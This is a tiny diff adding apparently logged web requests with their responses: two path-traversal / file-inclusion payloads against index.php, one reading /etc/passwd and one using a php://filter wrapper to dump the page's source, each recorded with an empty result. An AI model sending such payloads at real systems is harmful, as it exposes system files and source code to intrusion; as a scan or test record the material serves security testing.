@@ -1,0 +1,4 @@
+== /index.php?url=../../../../etc/passwd
+[000 0B] 
+== /index.php?url=php://filter/convert.base64-encode/resource=index.php
+[000 0B] 
